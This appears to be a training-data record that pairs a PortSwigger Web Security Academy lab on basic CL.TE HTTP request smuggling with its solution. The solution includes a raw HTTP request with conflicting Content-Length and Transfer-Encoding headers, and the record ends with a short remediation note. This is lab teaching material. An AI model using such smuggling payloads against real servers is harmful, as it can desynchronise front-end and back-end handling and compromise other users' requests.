# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

How do I solve this PortSwigger Web Security Academy lab?

Title: HTTP request smuggling, basic CL.TE vulnerability
Difficulty: Practitioner
Category: HTTP request smuggling

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

Note

 Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers HTTP request smuggling: "HTTP request smuggling, basic CL.TE vulnerability".

## Solution steps

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G`

 The second response should say: `Unrecognized method GPOST`.

## Vulnerability note

Underlying issue: HTTP request smuggling (CWE-444). Use a consistent, well-configured front-end/back-end HTTP stack; reject ambiguous Transfer-Encoding/Content-Length combinations.
